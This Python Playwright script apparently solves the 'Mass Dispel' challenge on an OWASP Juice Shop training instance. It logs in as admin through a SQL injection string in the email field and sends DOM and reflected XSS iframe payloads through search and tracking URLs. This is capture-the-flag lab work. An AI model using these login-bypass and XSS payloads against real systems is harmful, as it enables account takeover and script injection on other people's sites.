#!/usr/bin/env python3
"""
Mass Dispel Challenge - Fresh Approach
Trigger multiple unsolved challenges to get multiple notifications
"""

from playwright.sync_api import sync_playwright
import time
import requests
import json

TARGET = "http://66.42.93.220:3000"

def solve_mass_dispel():
    """Solve Mass Dispel by triggering multiple fresh notifications"""
    
    print("🔔 MASS DISPEL CHALLENGE - Fresh Notifications")
    print("=" * 60)
    
    # First check which challenges are NOT solved yet
    print("\n📍 Finding unsolved challenges...")
    
    session = requests.Session()
    login_resp = session.post(
        f"{TARGET}/rest/user/login",
        json={"email": "admin@juice-sh.op'--", "password": "x"}
    )
    
    if login_resp.status_code == 200:
        token = login_resp.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
    
    # Get all challenges
    resp = session.get(f"{TARGET}/api/Challenges/")
    unsolved = []
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        unsolved = [c for c in challenges if not c.get('solved', False)]
        print(f"   Found {len(unsolved)} unsolved challenges")
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)  # Show browser
        page = browser.new_page()
        
        # Navigate to the site
        print("\n📍 Navigate to Juice Shop...")
        page.goto(TARGET, wait_until="networkidle", timeout=30000)
        time.sleep(2)
        
        # Set up to monitor notifications
        print("\n📍 Setting up notification monitoring...")
        
        # Inject JavaScript to track notifications
        page.evaluate("""
            window.notificationCount = 0;
            window.notifications = [];
            
            // Override the notification creation
            const originalNotification = window.Notification || function() {};
            window.Notification = function(...args) {
                window.notificationCount++;
                window.notifications.push(args);
                return originalNotification.apply(this, args);
            };
            
            // Monitor for toast/snackbar elements
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1) {  // Element node
                            const text = node.textContent || '';
                            if (text.includes('Challenge') && text.includes('solved')) {
                                window.notificationCount++;
                                console.log('Notification detected:', text);
                            }
                        }
                    });
                });
            });
            observer.observe(document.body, { childList: true, subtree: true });
        """)
        
        print("\n📍 Triggering multiple easy challenges quickly...")
        
        # List of easy challenges to trigger
        easy_triggers = [
            # DOM XSS with a search query
            {
                "action": "navigate",
                "url": f"{TARGET}/#/search?q=<iframe src=\"javascript:alert('xss')\">",
                "name": "DOM XSS"
            },
            # Access score board
            {
                "action": "navigate",
                "url": f"{TARGET}/#/score-board",
                "name": "Score Board"
            },
            # Reflected XSS
            {
                "action": "navigate", 
                "url": f"{TARGET}/#/track-result?id=<iframe src=\"javascript:alert('xss')\">",
                "name": "Reflected XSS"
            },
            # Access administration
            {
                "action": "navigate",
                "url": f"{TARGET}/#/administration",
                "name": "Admin Section"
            },
            # Bonus Payload
            {
                "action": "navigate",
                "url": f"{TARGET}/#/search?q=<iframe width='100%' height='166' scrolling='no' frameborder='no' allow='autoplay' src='https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076'>",
                "name": "Bonus Payload"
            }
        ]
        
        # Execute triggers in rapid succession
        notification_count = 0
        for trigger in easy_triggers[:3]:  # Try 3 at once
            print(f"   Triggering: {trigger['name']}...")
            try:
                page.goto(trigger['url'], wait_until="domcontentloaded", timeout=5000)
                # Don't wait between triggers to get overlapping notifications
            except:
                pass
        
        # Wait a moment for notifications to appear
        time.sleep(2)
        
        # Check notification count
        notification_count = page.evaluate("window.notificationCount")
        print(f"\n🎯 Detected {notification_count} notifications")
        
        # Look for visible notifications
        print("\n📍 Looking for visible notification elements...")
        
        # Find all notification-like elements
        selectors = [
            '.challenge-solved-toast',
            'simple-notification',
            '.mat-snack-bar-container',
            '[class*="toast"]',
            '[class*="notification"]',
            '[class*="snackbar"]'
        ]
        
        visible_notifications = []
        for selector in selectors:
            elements = page.locator(selector).all()
            for elem in elements:
                if elem.is_visible():
                    visible_notifications.append(elem)
            if elements:
                print(f"   Found {len(elements)} elements with: {selector}")
        
        if len(visible_notifications) >= 2:
            print(f"\n✅ Found {len(visible_notifications)} visible notifications!")
            
            # Try to dismiss them all at once
            print("\n📍 Attempting mass dismissal...")
            
            # Method 1: ESC key
            print("   Pressing ESC...")
            page.keyboard.press("Escape")
            time.sleep(1)
            
            # Method 2: Click outside
            print("   Clicking outside...")
            page.mouse.click(50, 50)
            time.sleep(1)
            
            # Method 3: Rapid clicks on close buttons
            print("   Looking for close buttons...")
            close_buttons = page.locator('button[class*="close"], [aria-label*="Close"], .notification-close').all()
            if close_buttons:
                print(f"   Found {len(close_buttons)} close buttons, clicking all...")
                for btn in close_buttons:
                    try:
                        btn.click(timeout=500)
                    except:
                        pass
        
        # Take screenshot
        page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/mass_dispel_fresh.png")
        print("\n📸 Screenshot saved: mass_dispel_fresh.png")
        
        browser.close()
    
    # Check status
    print("\n📊 Checking challenge status...")
    
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        mass_dispel = next((c for c in challenges if 'Mass Dispel' in c.get('name', '')), None)
        
        if mass_dispel and mass_dispel.get('solved'):
            print(f"\n✅ SUCCESS! {mass_dispel['name']} SOLVED!")
            return True
        else:
            print("\n⚠️ Not solved yet")
            print("💡 The key is having multiple notifications visible simultaneously")
            print("   and dismissing them all in one action")
    
    return False

if __name__ == "__main__":
    solve_mass_dispel()